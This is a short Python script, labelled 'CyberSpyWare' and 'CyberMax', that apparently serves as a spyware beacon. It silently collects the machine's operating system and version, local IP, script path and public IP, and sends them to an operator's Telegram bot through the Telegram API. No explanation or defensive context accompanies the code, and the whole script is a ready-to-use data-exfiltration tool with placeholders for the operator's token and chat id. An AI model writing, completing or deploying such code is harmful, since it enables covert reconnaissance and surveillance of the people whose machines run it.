#@CyberSpyWare
#CyberMax

import platform
import socket
import requests
import sys

#BotToken
token = "YOUR TELEGRAM BOT TOKEN"


Path = sys.path[0]
os_name = platform.system()
os_version = platform.release()




url = "https://api.telegram.org/bot{}/sendMessage".format(token)


ip = requests.get("https://api.ipify.org").text

host = socket.gethostname()
hos = socket.gethostbyname(host)

values = {
'chat_id':'Your Telegram Id',
'text':'Operating System  : ' +os_name+
'\nVersion : ' + os_version+
'\nHost : ' + hos+
'\nPath : ' + Path+
'\nIp : ' + ip
}
res = requests.post(url, data=values)
print("CyberMax")


